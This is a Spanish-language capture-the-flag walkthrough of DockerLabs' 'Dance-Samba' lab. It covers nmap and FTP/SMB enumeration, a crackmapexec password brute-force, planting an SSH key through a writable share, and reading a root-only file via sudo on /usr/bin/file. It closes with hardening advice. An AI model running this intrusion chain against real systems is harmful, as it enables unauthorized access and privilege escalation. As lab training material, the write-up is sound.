
# Writeup Template: Maquina `[ Dance-Samba ]`

- Tags: #Dance-Samba
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Dance-Samba](https://mega.nz/file/JCtnnLAJ#yeVJuvp8zhHiM55IHvnFJZ62_cjR1vmH-miDBc30slY) El laboratorio Dance-Samba de DockerLabs es un entorno vulnerable de nivel medio en Linux que requiere enumerar servicios como FTP y Samba, acceder a recursos compartidos, obtener credenciales y acceder vía SSH. El objetivo final es escalar privilegios explotando configuraciones inseguras con sudo.

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x dance-samba.zip
sudo bash auto_deploy.sh dance-samba.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p21,22,139,445 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
21/tcp  open  ftp         vsftpd 3.0.5
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```
---

## Enumeracion de [Servicio FTP ]
Procedemos con la enumeracion de este servicio:
```bash
nmap --script ftp-anon.nse -p 21 172.17.0.2
```

**Hallazgos Relevantes:**
Tenemos habilitado al usuario **Anonymous**, Esto nos permite conectarnos sin proporcionar contrasena:
```bash
ftp-anon: Anonymous FTP login allowed (FTP code 230)
-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
```

Procedemos a conectarnos para enumerar este servicio:
```bash
ftp 172.17.0.2
```

Indicamos el usuario:
```bash
anonymous # ( Enter )
```

Una ves dentro vemos que tenemos este archivo **( nota.txt )** El cual descargamos:
```bash
get nota.txt
```

Revisando el contenido de este archivo tenemos lo siguiente:
```bash
No sé qué hacer con Macarena, está obsesionada con Donald.
```
### Credenciales Encontradas
Tenemos dos posibles usuarios del sistema:
```bash
macarena
donal
```

## Enumeracion De [Servicio SMB]
Realizamos una enumeracion con esta herramiente: **( enum4linux )** para detectar posibles fallas o recursos compartidos:
```bash
enum4linux -S 172.17.0.2
```

Reporte:
```bash
 Sharename       Type      Comment
 ---------       ----      -------
 print$          Disk      Printer Drivers
 macarena        Disk      
 IPC$            IPC       IPC Service (81103d670a14 server (Samba, Ubuntu))

[+] Attempting to map shares on 172.17.0.2

//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A
//172.17.0.2/macarena   Mapping: DENIED Listing: N/A Writing: N/A

[E] Cant understand response:

NT_STATUS_CONNECTION_REFUSED listing
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A
```

Realizaremos un ataque de fuerza bruta para determinar la password del usuario macarena asi podremos ver su contenido si tenemos exito:
Usaremos como diccionario a los dos usuarios previamente antes descubierto:
```bash
crackmapexec smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt
```

Como resultado obtenemos las credenciales de acceso del usuario **( Macarena )**:
```bash
SMB         172.17.0.2      445    81103D670A14     [+] 81103D670A14\macarena:donald
```

Procedemos a conectarnos con este usuario por **SMB**
```bash
smbclient //172.17.0.2/macarena -U macarena%donald
```

Listando los archivos de este servicio tenemos un: **( user.txt )** el cual descargamos:
```bash
get user.txt
```

Revisando su contenido tenemos una cadena en **MD5**, Usando herramientas only no tuvimos suerte al intentar decodificar:
```bash
ef65ad731de0ebabcb371fa3ad4972f1
```

Ahora con **( smbmap )** enumeramos ya con estas credenciales para ver si tenemos nuevos resultados.
```bash
smbmap -H 172.17.0.2 -u 'macarena' -p 'donald'
```

Vemos que tenemos capacidad de escritura sobre este directorio:
```bash
 print$                                                  READ ONLY       Printer Drivers
 macarena                                                READ, WRITE
```
  
---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Tenemos capacidad de escritura sobre el directorio de **macarena**, Asi que crearemos unas llaves **ssh** para despues podernos conectar atraves de este servicio sin proporcionar contrasena.
```bash
puttygen -t rsa -b 2048 -O private-openssh -o gm4tsy
```

Damos permisos de ejecucion:
```bash
chmod 600 gm4tsy
```

Creamos el archivo **autorized_keys**:
```bash
puttygen gm4tsy -o authorized_keys -O public-openssh
```

En el servicio **SMB** crearemos una carpeta **( .ssh )** donde guardaremos el archivo **autorized_keys**
```bash
mkdir .ssh
```

Ahora subimos el archivo **autorized_keys** en el servicio **SMB** de la siguiente manera:
```bash
put authorized_keys .ssh/authorized_keys
```
### Ejecucion del Ataque
Una ves subido el archivo correctamente provamos la coneccion por **ssh** y usamos la llave privada como identificador desde nuestra maquina atacante:
### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh -i gm4tsy macarena@172.17.0.2
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
find / -iname "secret" 2>/dev/null
```

**Hallazgos Clave:**
Buscando en el sistema por este tipo de archivos encontramos esto:
```bash
ls -l /home/secret

-rw-r--r-- 1 root root 49 Aug 19  2024 hash
```

Si revisamos el contenido es un hash desconocido que verificaremos en la siguiente web: [CyberChef](https://gchq.github.io/CyberChef/) donde pegaremos el **hash** y obtenemos el siguiente resultado:
```bash
supersecurepassword
```

Ahora tenemos una password que usaremos intentar loguearnos con un usuario del sistema:
**Nota** Intentado usar esa password para el usuario **root** no funciona,
### Explotacion de Privilegios
Como solo existen dos usuarios en el sistema, Pensamos que esa password es del usuario **macarena** y lo comprobamos de la siguiente manera:
```bash
su macarena # ( supersecurepassword )
```

###### Usuario `[ Macarena ]`:
Ahora listamos los permisos de este usuario:
```bash
sudo -l

User macarena may run the following commands on 81103d670a14:
    (ALL : ALL) /usr/bin/file # Tenemos una via potencial de migrar a root
```

Listando los archivos del directorio **( /opt )** tenemos el siguiente que pertenece a **root**
```bash
ls -l /opt/password.txt 
-rw------- 1 root root 16 Aug 19  2024 /opt/password.txt
```

Ahora nos aprovecharemos de esto para leer el contenido de ese archivo;
```bash
sudo -u root /usr/bin/file -f /opt/password.txt
```

Tenemos la contrasena de **root** **( rooteable2 )**
```bash
# Comando para escalar al usuario: ( root )
su root # ( rooteable2 )
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@81103d670a14:/home/macarena# whoami
root
```

###### Flags Root:
```bash
-rw-r--r--  1 root root   32 Aug 19  2024 root.txt
-rw-r--r--  1 root root   33 Aug 19  2024 true_root.txt
```
---

## Lecciones Aprendidas
1. Aprendimos enumeracion del servicio **FTP**
2. Aprendimos enumeracion del servicio **SMB**
3. Aprendimos a explotar el binario **file**

## Recomendaciones de Seguridad
- Para el servicio **FTP** deshabilitar al usuario **Anonymous** ya que permite a un atacante loguearse sin proporcionar contrasena
- Para el servicio **SMB** Limitar los permisos de escritura sobre un directorio.
- No almacenar **contrasenas** en archivos de texto.
